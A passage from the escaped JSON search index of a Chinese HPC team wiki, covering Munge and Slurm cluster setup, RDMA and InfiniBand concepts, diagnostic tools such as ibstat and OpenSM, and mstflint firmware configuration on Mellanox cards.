Munge","text":"<p>\u5728\u4e3b\u8282\u70b9\u751f\u6210\u5bc6\u94a5\uff0c\u5e76\u5171\u4eab\u5230\u76ee\u5f55\u4e2d\u4f9b\u5176\u4ed6\u8282\u70b9\u4f7f\u7528\uff1a</p> <pre><code># \u5728 /slurm \u4e0b\u521b\u5efa\u548c /etc \u4e00\u6837\u7684\u76ee\u5f55\u7ed3\u6784\nmkdir -p /slurm/etc/default\n# \u5bc6\u94a5\u751f\u6210\u5230 /etc/munge/munge.key\nsudo -u munge /usr/sbin/mungekey --verbose\n# \u79fb\u52a8\u5bc6\u94a5\nmv /etc/munge /slurm/etc\n# \u79fb\u52a8\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\nmv /etc/default/munge /slurm/etc/default/munge\n# \u4fee\u6539 munge \u5c06 key-file \u6307\u5411 /slurm/etc/munge/munge.key\n# \u5373\uff1aOPTIONS=\"--key-file=/slurm/etc/munge/munge.key --num-threads=2\"\nvim /slurm/etc/default/munge\n# \u914d\u7f6e\u6743\u9650\nchown -R munge:munge /slurm/etc/munge\n# \u4fee\u6539 munge.service \u4e2d\u7684 EnvironmentFile \u4e3a /slurm/etc/default/munge\n# \u5e76\u6dfb\u52a0 NFS \u4f9d\u8d56\u548c\u68c0\u6d4b\nvim /lib/systemd/system/munge.service\n# \u542f\u7528\u670d\u52a1\nsudo systemctl enable munge.service\n# \u8fd0\u884c\u670d\u52a1\nsudo systemctl start munge.service\n</code></pre> <p>\u4ece\u8282\u70b9\uff1a</p> <pre><code># \u4fee\u6539 munge.service \u4e2d\u7684 EnvironmentFile \u4e3a /slurm/etc/default/munge\n# \u5e76\u6dfb\u52a0 NFS \u4f9d\u8d56\u548c\u68c0\u6d4b\nvim /lib/systemd/system/munge.service\n# \u542f\u7528\u670d\u52a1\nsudo systemctl enable munge.service\n# \u8fd0\u884c\u670d\u52a1\nsudo systemctl start munge.service\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u6d4b\u8bd5-munge","title":"\u6d4b\u8bd5 Munge","text":"<p>\u5728\u4efb\u4e00\u8282\u70b9\u4e0a\u4f7f\u7528 <code>munge -n</code> \u751f\u6210\u4e00\u6bb5\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5728\u5176\u4ed6\u8282\u70b9\u4e0a\u4f7f\u7528 <code>unmunge</code> \u89e3\u5bc6\u3002</p> <pre><code>munge -n | ssh node2 unmunge\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u5b89\u88c5-slurm","title":"\u5b89\u88c5 Slurm","text":"<p>Quote</p> <ul> <li>Quick Start Administrator Guide</li> </ul> <pre><code># \u4e3b\u8282\u70b9\napt install slurmctld\n# \u4ece\u8282\u70b9\napt install slurmd\n</code></pre> <p>\u5b89\u88c5\u5b8c\u6210\u540e\u5e94\u5f53\u4f1a\u81ea\u52a8\u751f\u6210 systemd unit \u6587\u4ef6\uff0c\u5b8c\u6210 <code>slurm.conf</code> \u7684\u914d\u7f6e\u540e\u5728\u4e0d\u540c\u8282\u70b9\u4e0a\u542f\u52a8\u76f8\u5e94\u7684\u670d\u52a1\uff1a</p> <ul> <li>\u4e3b\u8282\u70b9\uff1a<code>sudo systemctl enable slurmctld.service</code></li> <li>\u4ece\u8282\u70b9\uff1a<code>sudo systemctl enable slurmd.service</code></li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u914d\u7f6e-slurm","title":"\u914d\u7f6e Slurm","text":"<p>Quote</p> <ul> <li>Slurm Configuration Tool - Slurm</li> <li>slurm.conf - Slurm</li> </ul> <p>\u5e38\u7528\u7684\u914d\u7f6e\u9879\u8bb0\u5f55\u5982\u4e0b\uff1a</p> slurm.conf<pre><code># \u901a\u7528\nReturnToService=2 # \u4e00\u65e6\u8282\u70b9\u6062\u590d\u5373\u8bbe\u7f6e\u4e3a\u53ef\u7528\uff0c\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u624b\u52a8\u8bbe\u7f6e\n\n# \u8282\u70b9\nNodeName\nNodeHostname\nNodeAddr\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u63d2\u4ef6","title":"\u63d2\u4ef6","text":"<ul> <li><code>task/affinity</code>\uff1a\u7528\u4e8e\u4efb\u52a1\u7ed1\u6838</li> <li>cgroup \u76f8\u5173<ul> <li><code>proctrack/cgroup</code>\uff1a\u4f7f\u7528 Linux cgroup \u63a7\u5236\u4efb\u52a1\u8fdb\u7a0b\u6811</li> <li><code>task/cgroup</code>\uff1a\u4f7f\u7528 Linux cgroup \u63a7\u5236\u4efb\u52a1\u80fd\u4f7f\u7528\u7684\u8d44\u6e90\uff08\u552f\u4e00\u80fd\u5e72\u8fd9\u4e8b\u7684\u63d2\u4ef6\uff09</li> <li><code>jobacct_gather/cgroup</code>\uff1a\u4f7f\u7528 Linux cgroup \u6536\u96c6\u4efb\u52a1\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#cgroup","title":"cgroup","text":"<p>Quote</p> <p>cgroup - Slurm</p> <p><code>cgroup.conf</code> \u603b\u662f\u5e94\u5f53\u653e\u7f6e\u5728 <code>slurm.conf</code> \u7684\u540c\u7ea7\u76ee\u5f55\u4e0b\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#slurm-\u7ef4\u62a4","title":"Slurm \u7ef4\u62a4","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#slurm-\u5e38\u89c1\u95ee\u9898","title":"Slurm \u5e38\u89c1\u95ee\u9898","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#zero-bytes-were-transmitted-or-received","title":"<code>Zero Bytes were transmitted or received</code>","text":"<p>\u4e00\u822c\u662f <code>munge</code> \u670d\u52a1\u672a\u542f\u52a8\u6216\u914d\u7f6e\u9519\u8bef\u5bfc\u81f4\u7684\u3002\u68c0\u67e5 <code>munge</code> \u670d\u52a1\u662f\u5426\u6b63\u5e38\u8fd0\u884c\uff0c\u4ee5\u53ca\u80fd\u5426\u901a\u8fc7\u89e3\u5bc6\u6d4b\u8bd5\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#slurm-\u5f00\u53d1","title":"Slurm \u5f00\u53d1","text":"<p>Quote</p> <ul> <li>Slurm Programmer's Guide - Slurm</li> <li>SchedMD/slurm - GitHub</li> </ul> <p>Slurm \u4f5c\u4e3a\u6211\u4eec\u5e38\u7528\u7684\u4efb\u52a1\u8c03\u5ea6\u7cfb\u7edf\uff0c\u6709\u5fc5\u8981\u6df1\u5165\u4e86\u89e3\u5176\u5de5\u4f5c\u539f\u7406\u751a\u81f3\u6d4f\u89c8\u6e90\u7801\uff0c\u4ee5\u4fbf\u4e8e\u66f4\u597d\u5730\u7406\u89e3\u96c6\u7fa4\u7ba1\u7406\u548c\u5e76\u884c\u4efb\u52a1\u8c03\u5ea6\u7cfb\u7edf\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/","title":"\u4f18\u5316\u65b9\u5411\u6982\u8ff0","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/#\u4f18\u5316\u65b9\u5411\u6982\u8ff0","title":"\u4f18\u5316\u65b9\u5411\u6982\u8ff0","text":"<p>\u77ed\u5b66\u671f\u76f8\u5173</p> <p>\u8f6f\u4ef6\u6027\u80fd\u7684\u4f18\u5316\u662f\u6211\u4eec\u77ed\u5b66\u671f\u8bfe\u7a0b\u7684\u91cd\u8981\u5185\u5bb9\u4e4b\u4e00\u3002\u5728\u6691\u671f\u7684\u77ed\u5b66\u671f\u8bfe\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c06\u4f1a\u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\uff0cSIMD \u6307\u4ee4\u7ea7\u5e76\u884c\uff0cOpenMP \u7ebf\u7a0b\u7ea7\u5e76\u884c\uff0cMPI \u8fdb\u7a0b\u7ea7\u5e76\u884c\uff0c\u4ee5\u53ca GPU \u4e0a\u7684 CUDA \u7f16\u7a0b\u7b49\u8bf8\u591a\u8bdd\u9898\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd9\u4e00\u90e8\u5206\u8fd8\u662f\u77ed\u5b66\u671f\u8bfe\u7a0b\u5b9e\u9a8c\u4e0e\u5927\u4f5c\u4e1a\u7684\u91cd\u8981\u57fa\u7840\u77e5\u8bc6\u3002</p> <p>\u5728\u6587\u6863\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u53c2\u8003\u6211\u4eec\u7684\u77ed\u5b66\u671f\u8bfe\u4ef6\uff0c\u4ece\u800c\u66f4\u597d\u5730\u7406\u89e3\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9:</p> <ul> <li>\u4f53\u7cfb\u7ed3\u6784\uff1a<ul> <li>2024: \u4f53\u7cfb\u7ed3\u6784\u4e0e\u9ad8\u6027\u80fd\u57fa\u7840</li> </ul> </li> <li>OpenMP / MPI \u5e76\u884c\u8ba1\u7b97\u57fa\u7840\uff1a<ul> <li>2024: OpenMP \u90e8\u5206 , MPI \u90e8\u5206</li> <li>2023: OpenMP \u90e8\u5206 , MPI \u90e8\u5206</li> </ul> </li> <li>\u6027\u80fd\u5206\u6790\u6280\u672f\uff1a<ul> <li>2024: \u6027\u80fd\u5206\u6790\u6280\u672f\u57fa\u7840 Profiling</li> </ul> </li> </ul> <p>\u4e5f\u6b22\u8fce\u6311\u6218\u5386\u5e74\u7684\u77ed\u5b66\u671f Lab \u4e0e\u5927\u4f5c\u4e1a\uff1a</p> <ul> <li>2024 Lab 2: NumPy \u5411\u91cf\u5316\u8ba1\u7b97</li> <li>2024 Lab 3: GPU \u901a\u7528\u77e9\u9635\u4e58\u6cd5</li> <li>2024 Lab 4: Solver Challenge!</li> </ul> <p>Todo</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/#\u53c2\u8003\u6587\u6863","title":"\u53c2\u8003\u6587\u6863","text":"<ul> <li>Performance Engineering - hpc-wiki.info</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/HPN/","title":"\u9ad8\u6027\u80fd\u7f51\u7edc","text":""},{"location":"optimization/HPN/#\u9ad8\u6027\u80fd\u7f51\u7edc","title":"\u9ad8\u6027\u80fd\u7f51\u7edc","text":"<p>\u6b22\u8fce\u6765\u5230 HPN \u7684\u4e16\u754c\uff01</p> <p>\u968f\u7740 AI \u7684\u53d1\u5c55\u548c\u6570\u636e\u4e2d\u5fc3\u89c4\u6a21\u7684\u4e0d\u65ad\u6269\u5927\uff0c\u9ad8\u6027\u80fd\u7f51\u7edc\u7684\u9700\u6c42\u65e5\u76ca\u589e\u957f\u3002\u672c\u7bc7\u7b14\u8bb0\u662f\u5bf9\u9ad8\u6027\u80fd\u7f51\u7edc\u65b9\u5411\u7684\u7efc\u8ff0\u3002\u6211\u4eec\u5c06\u68b3\u7406 HPN \u7684\u8f6f\u786c\u4ef6\u5c42\u6b21\u7ed3\u6784\uff0c\u4ece\u6574\u4f53\u4e0a\u628a\u63e1 HPN \u7684\u6280\u672f\u548c\u77e5\u8bc6\u4f53\u7cfb\u3002\u81f3\u4e8e\u5177\u4f53\u7684\u5185\u5bb9\uff0c\u8bf7\u67e5\u770b\u5176\u4ed6\u5b50\u7b14\u8bb0\u3002</p> <p></p>"},{"location":"optimization/HPN/#rdma","title":"RDMA","text":"<p>\u5b66\u4e60 HPN \u5e94\u5f53\u4ece RDMA \u57fa\u672c\u6982\u5ff5\u5f00\u59cb\u3002\u76ee\u524d\uff0cRDMA \u5165\u95e8\u7684\u6700\u4f73\u4e2d\u6587\u6750\u6599\u662f Savir \u6240\u4f5c\u7684 RDMA \u6742\u8c08 - \u77e5\u4e4e\uff0c\u8bf7\u8bfb\u8005\u81ea\u884c\u9605\u8bfb\uff0c\u672c\u7bc7\u7b14\u8bb0\u4e0d\u4f1a\u518d\u8bb2\u89e3\u5176\u4e2d\u7684\u77e5\u8bc6\u3002\u5176\u4e2d\u57fa\u672c\u6982\u5ff5\u7bc7\uff08\u7b2c 1-12\uff09\u5fc5\u8bfb\uff0c\u540e\u9762\u7684\u5185\u5bb9\u53ef\u6839\u636e\u5de5\u4f5c\u9700\u8981\u5177\u4f53\u9009\u62e9\uff0c\u56e0\u4e3a RDMA \u5177\u4f53\u5b9e\u73b0\u4e4b\u95f4\u6709\u4e0d\u5c11\u5dee\u5f02\u3002</p> <p>\u8bfb\u8005\u5e94\u5f53\u4e86\u89e3\uff1a</p> <ul> <li>\u57fa\u672c\u5143\u7d20\uff1a<ul> <li>Send/Receive Queue</li> <li>Work Queue Element</li> <li>Queue Pair\uff1a\u5b58\u653e WQE \u7684\u4e00\u5757\u7a7a\u95f4<ul> <li>\u7279\u6b8a QP\uff1a<ul> <li>0\uff1a\u5b50\u7f51\u7ba1\u7406 Subnet Management Interface\uff08\u4ec5 InfiniBand\uff09</li> <li>1\uff1a\u901a\u7528\u670d\u52a1\u63a5\u53e3 General Service Interface\uff0c\u5305\u62ec CM</li> </ul> </li> <li>\u72b6\u6001\uff1aRST\u3001INIT\u3001RTR\u3001RTS\u3001SQD\u3001SQEr\u3001ERR</li> </ul> </li> <li>Queue Pair Context\uff1aS/RQ \u7684\u5730\u5740\u3001\u5927\u5c0f\u3001\u7f16\u53f7\u7b49\u4fe1\u606f<ul> <li>QPN 24b \u8282\u70b9\u552f\u4e00\uff0cGID 128b \u7f51\u7edc\u552f\u4e00</li> </ul> </li> <li>Completion Queue<ul> <li>\u53ef\u5173\u8054\u591a\u4e2a S/RQ</li> <li>\u540c\u4e00 WQ \u7684 CQE \u4fdd\u5e8f\uff1bSRQ \u548c RD \u4e0b\u7684 RQ \u4e0d\u4fdd\u5e8f</li> </ul> </li> <li>Completion Queue Element\uff1a<ul> <li>\u5305\u542b WQE \u7f16\u53f7</li> <li>\u9519\u8bef\u7c7b\u578b\uff1aImmediate\uff08\u7acb\u5373\u8fd4\u56de\u4e0a\u62a5\uff09/Completion\uff08CQE \u4e0a\u62a5\uff09/Asynchronous\uff08\u4e2d\u65ad\u4e0a\u62a5\uff09</li> <li>\u901a\u77e5\u65b9\u5f0f\uff1aPoll\u3001Notification</li> </ul> </li> </ul> </li> <li>\u64cd\u4f5c\u7c7b\u578b\uff1aSend-Receive\u3001Write\u3001Read\u3001Atomic</li> <li>\u670d\u52a1\u7c7b\u578b\uff1aReliable/Unreliable\u3001Connection/Datagram<ul> <li>UD\uff1aQP \u95f4\u65e0\u8fde\u63a5\uff0cWQE \u4e2d\u586b Address\uff1b\u4e3a\u4e86\u5b89\u5168\uff0c\u6b64\u65f6\u6709 QKey\uff0c\u8bf7\u6c42\u4e2d\u4e5f\u5e26\u4e0a<ul> <li>\u6700\u9ad8\u4f4d\u4e3a <code>1</code> \u7684 QKey \u662f\u7279\u6743 QKey\uff0c\u53ea\u6709\u5185\u6838\u80fd\u7528</li> </ul> </li> <li>RD\uff1aEnd-to-End Context</li> </ul> </li> <li>\u8d44\u6e90\u7ed3\u6784\uff1a<ul> <li>Memory Region\uff1a<ul> <li>\u4f5c\u7528\uff1aVA/PA/IOVA \u8f6c\u6362\u3001R/LKey \u8bbf\u95ee\u6743\u9650\u63a7\u5236\u3001Pin \u9875\u9762</li> <li>\u6743\u9650\uff1aRemote/Local Read/Write/Atomic</li> <li>L/RKey \u7ec4\u6210\uff1a24b index \u7d22\u5f15\u8f6c\u6362\u8868 + 8b key \u6821\u9a8c</li> <li>\u8981\u4f7f RKey \u5931\u6548\uff0c\u53ea\u80fd\u6ce8\u9500\u91cd\u6ce8\u518c</li> <li>Memory Window\uff1a\u52a8\u6001\u7ed1\u5b9a\u5230 MR\uff0c\u7075\u6d3b\u63a7\u5236\u6743\u9650\uff0c\u65e0\u9700\u5185\u6838\u6001</li> </ul> </li> <li>Scatter Gather Element/List\uff1a<ul> <li>\u5185\u5bb9\uff1a\u5730\u5740\u3001\u957f\u5ea6\u3001LKey</li> </ul> </li> <li>Protection Domain\uff1a\u5b89\u5168\u6027\uff0c\u963b\u6b62 AH\u3001QP \u548c MR \u7b49\u8d44\u6e90\u7684\u8de8 PD \u4e92\u8bbf</li> <li>Address Handle\uff1a\u5730\u5740\u6307 GID\u3001\u7aef\u53e3\u53f7\u548c MAC \u5730\u5740\u7b49\uff0cUD \u901a\u8fc7 AH \u7d22\u5f15\u5730\u5740\u4fe1\u606f</li> <li>Queue Pair\u3001Completion Queue</li> </ul> </li> <li>\u9ad8\u7ea7\u8bdd\u9898\uff1a<ul> <li>SRQ\uff1a<ul> <li>RC/UC/UD \u63a5\u6536\u65b9\u5fc5\u987b\u9884\u5148\u4e0b\u53d1\u8db3\u591f\u591a\u7684 WQE\uff0c\u9020\u6210\u5927\u91cf RQ \u6d6a\u8d39\uff0c\u901a\u8fc7\u5171\u4eab\u8282\u7701\u5185\u5b58</li> <li>\u6240\u5c5e\u7684 PD \u53ef\u4ee5\u4e0e\u5173\u8054\u7684 QP \u4e0d\u540c</li> <li>\u72b6\u6001\uff1a\u53ea\u6709\u9519\u8bef\u548c\u975e\u9519\u8bef\uff0c\u9519\u8bef\u4e86\u53ea\u80fd\u9500\u6bc1</li> </ul> </li> <li>Connection Management Protocol\uff1a<ul> <li>MAnagement Datagram\uff1a\u57fa\u4e8e UD \u5b9e\u73b0\uff0c\u5411\u4e0a\u652f\u6301 GS \u548c SM\uff1b\u4f7f\u7528 QP1 \u548c QKey <code>0x8001_0000</code></li> </ul> </li> </ul> </li> <li> <p>\u5efa\u94fe\uff1aConnecting Queue Pairs \u00ab RDMAmojo</p> \u4f20\u8f93\u7c7b\u578b \u9700\u8981\u4ea4\u6362\u7684\u4fe1\u606f RC Send GID, QPN RC Write/Read GID, QPN, VA, RKey UD Send GID, QPN, QKey </li> </ul> <p>\u4f5c\u8005\u6700\u540e\u4e00\u6b21\u66f4\u65b0\u662f\u5728 2023 \u5e74\uff0c\u5c1a\u6709\u4e00\u4e9b\u5185\u5bb9\u9e3d\u4e86\u6ca1\u6709\u4ecb\u7ecd\u3002\u63a5\u4e0b\u6765\u672c\u7ae0\u5c31\u4e00\u4e9b\u9ad8\u7ea7\u8bdd\u9898\u8fdb\u884c\u8865\u5145\u3002</p> <p>\u4e13\u680f\u4e2d\u53ea\u4f5c\u4e86\u6982\u5ff5\u4ecb\u7ecd\u3002\u5982\u679c\u5e0c\u671b\u5c06\u4e60\u5f97\u7684\u6982\u5ff5\u5e94\u7528\u5230\u7f16\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u9605\u8bfb\u4e0b\u9762\u7684\u4e24\u4efd\u6750\u6599\u5165\u95e8 IB Verbs\u3002</p> <ul> <li>\u7b80\u5355\uff1aRDMA Tutorial - LSDS</li> <li>\u8be6\u7ec6\uff1aVerbs programming tutorial</li> </ul>"},{"location":"optimization/HPN/#extended-reliable-connection-xrc","title":"eXtended Reliable Connection (XRC)","text":"<p>Quote</p> <ul> <li>(2007) Microsoft PowerPoint - XRC</li> <li>(2008) [ofa-general] [PATCH 1/11] libibverbs: XRC base implementation</li> </ul> <p>XRC \u662f libfabric \u72ec\u6709\u7684\u529f\u80fd</p> <p>\u8fd8\u8bb0\u5f97 SRQ \u5417\uff1f\u5b83\u901a\u8fc7\u5171\u4eab RQ \u7684\u65b9\u5f0f\u5927\u91cf\u8282\u7701\u4e86\u63a5\u6536\u7aef\u7684\u5185\u5b58\u5360\u7528\u3002\u5047\u8bbe\u6709 \\(n\\) \u4e2a\u8282\u70b9\uff0c\u6bcf\u4e2a\u8282\u70b9\u6709 \\(c\\) \u4e2a\u6838\uff0c\u6bcf\u4e2a\u6838\u4e0a\u90fd\u8dd1\u4e00\u4e2a\u901a\u4fe1\u8fdb\u7a0b\uff1a</p> <p>SRQ \u5c06 QP \u6570\u4ece \\(n \\times c^2\\) \u964d\u4f4e\u5230 \\(n \\times c\\)\u3002</p> <p>XRC \u5c1d\u8bd5\u5728\u6b64\u4e4b\u4e0a\u7ee7\u7eed\u964d\u4f4e\u5185\u5b58\u5360\u7528\uff0c\u8fd9\u6b21\u901a\u8fc7\u51cf\u5c11\u8fde\u63a5\u6570\u7684\u65b9\u5f0f\u5b9e\u73b0\u3002</p> <p>XRC \u7684\u60f3\u6cd5\u7c7b\u4f3c\u4e8e RDMA RD</p>"},{"location":"optimization/HPN/#\u5176\u4ed6\u95ee\u9898","title":"\u5176\u4ed6\u95ee\u9898","text":"<ul> <li>\u4e3a\u4ec0\u4e48 SRQ \u548c RD \u4e0b\u7684 RQ \u4e0d\u4fdd\u5e8f\uff1f</li> </ul>"},{"location":"optimization/HPN/#\u8f6f\u4ef6\u6808","title":"\u8f6f\u4ef6\u6808","text":"<p>\u9605\u8bfb For the RDMA novice: libfabric, libibverbs, InfiniBand, OFED, MOFED? \u2014 Rohit Zambre\uff0c\u4e86\u89e3\u8fd9\u4e9b\u8f6f\u4ef6\u5305\u7684\u5173\u7cfb\u3002</p>"},{"location":"optimization/HPN/#\u5b9e\u7528\u5de5\u5177","title":"\u5b9e\u7528\u5de5\u5177","text":""},{"location":"optimization/HPN/#infiniband-diags","title":"infiniband-diags","text":"<p>\u63d0\u4f9b\u4e86\u975e\u5e38\u591a\u7684\u5de5\u5177\uff0c\u89c1 infiniband-diags(8)\u3002\u5728 Debian \u4e0a\uff0c\u5b83\u4eec\u4f4d\u4e8e <code>/usr/sbin</code> \u4e2d\u3002</p> <p>\u8fd9\u91cc\u8bb0\u5f55\u5e38\u7528\u7684\u4e00\u4e9b\uff1a</p> <pre><code># \u67e5\u8be2\nibstat\nibstatus\nibaddr\nibnodes\nibhosts\nibrouters\nibswitches\niblinkinfo\nibnetdiscover\n# \u67e5\u8be2\u5f53\u524d IB \u5b50\u7f51\u7ba1\u7406\u7684\u4f4d\u7f6e\nsminfo\n# \u6d4b\u8bd5\nibping # \u6ce8\u610f\uff0c\u9700\u8981\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u4f7f\u7528 ibping -S \u4f5c\u4e3a server\uff0c\u5426\u5219\u662f ping \u4e0d\u901a\u7684\u3002\nibping -c &lt;count&gt; -L &lt;lid&gt;\nibroute\nibtracert\n</code></pre>"},{"location":"optimization/HPN/#opensm","title":"OpenSM","text":"<p>IB \u7ba1\u7406\u4ea4\u6362\u673a\u80fd\u591f\u4f5c\u4e3a Subnet Manager\uff08SM\uff09\u6765\u7ba1\u7406 IB \u7f51\u7edc\u3002SM \u8d1f\u8d23\u53d1\u73b0\u548c\u914d\u7f6e\u6240\u6709 InfiniBand \u8bbe\u5907\u3002</p> <p>\u4f7f\u7528\u975e\u7f51\u7ba1 IB \u4ea4\u6362\u673a\u65f6\uff0cIB \u7f51\u7edc\u4e2d\u7f3a\u5c11 Subnet Manager\uff08SM\uff09\uff0c\u6b64\u65f6\u6240\u6709 HCA \u72b6\u6001\u4e3a Initializing\u3002\u53ef\u4ee5\u5728\u5176\u4e2d\u7684\u4e00\u53f0\u4e3b\u673a\u4e0a\u5b89\u88c5\u5f00\u6e90\u7684 OpenSM\uff1a</p> <pre><code>sudo apt install opensm\nsudo systemctl enable --now opensm\n</code></pre>"},{"location":"optimization/HPN/#mstflint","title":"mstflint","text":"<p>Quote</p> <ul> <li> Mellanox/mstflint: Mstflint - an open source version of MFT (Mellanox Firmware Tools)</li> </ul> <p><code>mstflint</code> \u662f Mellanox Firmware Flash Interface \u7684\u7f29\u5199\uff0c\u7528\u4e8e\u7ba1\u7406 Mellanox \u7f51\u5361\u7684\u56fa\u4ef6\u3002\u8bf8\u5982\u5207\u6362 RoCE \u4e0e InfiniBand \u6a21\u5f0f\u3001\u66f4\u65b0\u56fa\u4ef6\u7b49\u6bd4\u8f83\u5e95\u5c42\u7684\u64cd\u4f5c\u90fd\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u5de5\u5177\u5b8c\u6210\u3002</p> <p>\u4e0b\u9762\u4ee5\u5c06\u7aef\u53e3\u6a21\u5f0f\u4ece ETH(2) \u5207\u6362\u5230 IB(1) \u4e3a\u4f8b\u6f14\u793a\u547d\u4ee4\u7528\u6cd5\uff1a</p> <pre><code>$ mstconfig query\n$ sudo mstconfig -d 4b:00.0 set LINK_TYPE_P1=1\n\nDevice #1:\n----------\n\nDevice type:        ConnectX5\nName:               MCX555A-ECA_Ax_Bx\nDescription:        ConnectX-5 VPI adapter card; EDR IB (100Gb/s) and 100GbE; single-port QSFP28; PCIe3.0 x16; tall bracket; ROHS R6\nDevice:             4b:00.0\n\nConfigurations:                                     Next Boot       New\n        LINK_TYPE_P1                                ETH(2)               IB(1)\n\n Apply new Configuration? (y/n) [n] : y\nApplying... Done!\n-I- Please reboot machine to load new configurations.\n$ mstfwreset -d 4b:00.0 -l3 -y reset\n</code></pre> <p>\u5176\u4ed6\u547d\u4ee4\u89c1 mstflint \u53d1\u5e03\u81ea\u5e26\u7684\u624b\u518c\u3002</p> \u8001\u7248\u672c\u547d\u4ee4\u7559\u6863 <p>MLNX_OFED \u5305\u542b\u4e86 mstflint\uff0c\u4f46\u4e00\u822c\u7248\u672c\u8f83\u8001\uff0c\u4e0e\u65b0\u7248 mstflint \u547d\u4ee4\u4e0d\u517c\u5bb9\u3002\u8fd9\u91cc\u4ec5\u4f5c\u4e3a\u7559\u6863\u8bb0\u5f55\u4e00\u4e0b\u3002</p> <p>\u65b0\u7248\u672c\u76f8\u6bd4\u8001\u7248\u672c\u7684\u53d8\u5316\uff1a</p> <ul> <li>\u4e0d\u9700\u8981\u6267\u884c <code>mst start</code>\uff0c\u670d\u52a1\u81ea\u52a8\u542f\u52a8\u3002</li> <li>\u547d\u4ee4\u540d\u79f0\u53d1\u751f\u53d8\u5316\uff0c\u6bd4\u5982 <code>mlxconfig</code> \u53d8\u4e3a <code>mstconfig</code>\u3002</li> </ul> <pre><code># \u67e5\u770b\u6240\u6709\u8bbe\u5907\nmst status\n# \u7ebf\u7f06\nmst cable add # \u626b\u63cf\u7ebf\u7f06\uff0c\u7ebf\u7f06\u4e00\u822c\u4e0d\u4f1a\u81ea\u52a8\u88ab\u6dfb\u52a0\nmlxcables -d e3:00.0_cable_0 -q\n# \u94fe\u8def\nmlxlink\n# \u914d\u7f6e\nmlxconfig -d &lt;device&gt; query # \u67e5\u8be2\u8be6\u7ec6\u4fe1\u606f\nDevice #1:\n----------\nDevice type:    ConnectX5\nName:           MCX555A-ECA_Ax_Bx\nDescription:    ConnectX-5 VPI adapter card; EDR IB (100Gb/s) and 100GbE; single-port QSFP28; PCIe3.0 x16; tall bracket; ROHS R6\nDevice:         31:00.0\nConfigurations:                                      Next Boot\n        MEMIC_BAR_SIZE                              0\n        MEMIC_SIZE_LIMIT                            _256KB(1)\n        HOST_CHAINING_MODE                          DISABLED(0)\n        HOST_CHAINING_CACHE_DISABLE                 False(0)\n        HOST_CHAINING_DESCRIPTORS                   Array[0..7]\n        HOST_CHAINING_TOTAL_BUFFER_SIZE             Array[0..7]\n        FLEX_PARSER_PROFILE_ENABLE                  0\n        FLEX_IPV4_OVER_VXLAN_PORT                   0\n        ROCE_NEXT_PROTOCOL                          254\n        ESWITCH_HAIRPIN_DESCRIPTORS                 Array[0..7]\n        ESWITCH_HAIRPIN_TOT_BUFFER_SIZE             Array[0..7]\n        PF_BAR2_SIZE                                0\n</code></pre>"},{"location":"optimization/HPN/#hca-\u5361","title":"HCA \u5361","text":"<p>\u4f7f\u7528 <code>ibstat</code> \u547d\u4ee4\u53ef\u4ee5\u67e5\u770b HCA \u5361\u7684\u72b6\u6001\u3002\u53ea\u8981\u80fd\u5728\u8fd9\u91cc\u770b\u5230 HCA \u5361\uff0c\u5c31\u8bf4\u660e\u9a71\u52a8\u5df2\u7ecf\u52a0\u8f7d\u3002</p> <p>\u7aef\u53e3\u7684\u72b6\u6001\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a</p> State Physical State \u8bf4\u660e Down Disabled \u672a\u8fde\u63a5\u7ebf\u7f06 Polling Polling \u5982\u679c\u6301\u7eed\u5904\u4e8e\u8be5\u72b6\u6001\u8bf4\u660e IB \u5b50\u7f51\u6ca1\u6709 SM Active LinkUp \u8fde\u63a5\u6b63\u5e38"},{"location":"optimization/HPN/#dhcp-for-ipoib","title":"DHCP for IPoIB","text":"<p>\u6211\u4eec\u4f7f\u7528 dnsmasq \u4f5c\u4e3a DHCP \u670d\u52a1\u5668\u3002\u5728 dnsmasq \u5b98\u65b9\u793a\u4f8b\u4e2d\u6709\u8fd9\u6837\u4e00\u6bb5\uff1a</p> dnsmasq.conf<pre><code># Always give the InfiniBand interface with hardware address\n# 80:00:00:48:fe:80:00:00:00:00:00:00:f4:52:14:03:00:28:05:81 the\n# ip address 192.168.0.61. The client id is derived from the prefix\n# ff:00:00:00:00:00:02:00:00:02:c9:00 and the last 8 pairs of\n# hex digits of the hardware address.\n# dhcp-host=id:ff:00:00:00:00:00:02:00:00:02:c9:00:f4:52:14:03:00:28:05:81,192.168.0.61\n</code></pre> <p>\u53ef\u80fd\u662f\u56e0\u4e3a InfiniBand \u8fed\u4ee3\uff0c\u73b0\u5728\u5df2\u7ecf\u4e0d\u9002\u7528\u4e86\u3002\u6211\u4eec\u5728 NVIDIA 